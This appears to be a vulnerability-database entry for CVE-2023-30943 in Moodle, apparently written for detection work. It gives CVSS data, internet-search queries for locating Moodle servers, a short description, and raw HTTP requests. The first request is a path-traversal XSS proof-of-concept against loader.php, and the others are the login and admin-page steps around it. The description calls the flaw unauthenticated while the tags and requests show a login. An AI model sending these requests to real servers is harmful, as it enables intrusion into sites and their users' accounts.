---
layout: post
cve_id: CVE-2023-30943
title: Moodle - Cross-Site Scripting/Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-30943.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-30943.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: 'Successful exploitation of these vulnerabilities could lead to unauthorized
  access, data theft, and potential compromise of the Moodle application and its users.

  '
reference:
- https://www.sonarsource.com/blog/playing-dominos-with-moodles-security-1/?utm_source=twitter&utm_medium=social&utm_campaign=wordpress&utm_content=security&utm_term=mofu
- https://nvd.nist.gov/vuln/detail/CVE-2023-30943
- http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-77718
- https://bugzilla.redhat.com/show_bug.cgi?id=2188605
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/54TM5H5PDUDYXOQ7X7PPYWP4AJDAE73I/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
  cvss-score: 5.3
  cve-id: CVE-2023-30943
  cwe-id: CWE-610,CWE-73
  epss-score: 0.18436
  epss-percentile: 0.95017
  cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
metadata:
  max-request: 4
  vendor: moodle
  product: moodle
  shodan-query:
  - title:"Moodle"
  - cpe:"cpe:2.3:a:moodle:moodle"
  - http.title:"moodle"
  fofa-query: title="moodle"
  google-query: intitle:"moodle"
tags:
- cve
- cve2023
- moodle
- xss
- rce
- authenticated
- vuln
---

## üîç Vulnerability Description
The vulnerability was found Moodle which exists because the application allows a user to control path of the older to create in TinyMCE loaders. A remote user can send a specially crafted HTTP request and create arbitrary folders on the system. Moodle versions 4.1.x before 4.1.3 and 4.2.x before 4.2.0 are susceptible to an unauthenticated arbitrary folder creation, tracked as CVE-2023-30943. An attacker can leverage the creation of arbitrary folders to carry out a Stored Cross-Site Scripting (XSS) attack on the administration panel, resulting in arbitrary code execution on the server as soon as an administrator visits the panel.


## üåê HTTP Request
```nohighlight
GET /lib/editor/tiny/loader.php?rev=a/../../../../html/pix/f/<input><img%20src=x%20onerror=alert(document.domain)>.png HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
GET /login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Connection: close
Content-Length: 57
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

anchor=&logintoken=aIPXsp&username=sL0kru&password=GEscIo
```

```nohighlight
GET /admin/tool/filetypes/edit.php?name=add HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

